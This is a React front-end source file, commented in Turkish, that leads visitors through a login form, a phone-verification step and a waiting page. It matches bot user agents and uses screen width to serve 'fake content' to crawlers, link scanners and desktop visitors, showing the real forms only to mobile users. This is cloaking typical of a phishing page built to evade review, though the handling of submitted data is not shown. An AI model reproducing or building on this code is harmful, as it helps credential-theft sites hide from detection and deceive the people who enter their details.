import React, { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import Header from './Header';
import LoginForm from './LoginForm';
import Telefon from './Telefon';
import Bekleme from './Bekleme';
import HelpSection from './HelpSection';
import Footer from './Footer';
import { AuthProvider, useAuth } from './AuthContext';
import './App.css';

function ProtectedRoute({ children, isAllowed }) {
  return isAllowed ? children : <Navigate to="/" />;
}

function AppRoutes({ isBot, isMobile }) {
  const { state } = useAuth();
  const { isAuthenticated, isPhoneVerified } = state;

  // Bot veya desktop ise sahte içerik, mobil ise orijinal içerik
  const showFakeContent = isBot || !isMobile;

  return (
    <div id="page" className="page">
      {!showFakeContent && <Header />}
      <div id="content" className="container" role="main">
        <div className="wizard">
          <div className="main">
            <div className="row">
              <div className="col-md-9">
                <Routes>
                  <Route path="/" element={<LoginForm isBot={showFakeContent} />} />
                  <Route
                    path="/telefon"
                    element={
                      <ProtectedRoute isAllowed={isAuthenticated}>
                        <Telefon isBot={showFakeContent} />
                      </ProtectedRoute>
                    }
                  />
                  <Route
                    path="/bekleme"
                    element={
                      <ProtectedRoute isAllowed={isAuthenticated && isPhoneVerified}>
                        <Bekleme isBot={showFakeContent} />
                      </ProtectedRoute>
                    }
                  />
                  <Route path="*" element={<Navigate to="/" />} />
                </Routes>
              </div>
              <div className="col-md-3">
                {!showFakeContent && <HelpSection />}
              </div>
            </div>
          </div>
        </div>
      </div>
      {!showFakeContent && <Footer />}
    </div>
  );
}

export default function App() {
  const [isBot, setIsBot] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const userAgent = navigator.userAgent || '';
    console.log('User-Agent:', userAgent); // Hata ayıklama
    const botPatterns = [
      'Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Slurp', 'Baiduspider',
      'Applebot', 'facebookexternalhit', 'Twitterbot', 'LinkedInBot',
      'Pinterestbot', 'Slackbot', 'Discordbot'
    ];
    const detectedBot = botPatterns.some(bot => userAgent.includes(bot));
    console.log('Bot tespit edildi:', detectedBot); // Hata ayıklama

    // Cihaz türünü tespit et (ekran genişliğiyle)
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768); // 768px breakpoint
    };
    handleResize(); // İlk render'da çalıştır
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    setIsBot(prev => {
      const userAgent = navigator.userAgent || '';
      const detectedBot = ['Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Slurp', 'Baiduspider', 'Applebot', 'facebookexternalhit', 'Twitterbot', 'LinkedInBot', 'Pinterestbot', 'Slackbot', 'Discordbot'].some(bot => userAgent.includes(bot));
      return detectedBot;
    });
  }, []);

  return (
    <AuthProvider>
      <Router basename="/">
        <AppRoutes isBot={isBot} isMobile={isMobile} />
      </Router>
    </AuthProvider>
  );
}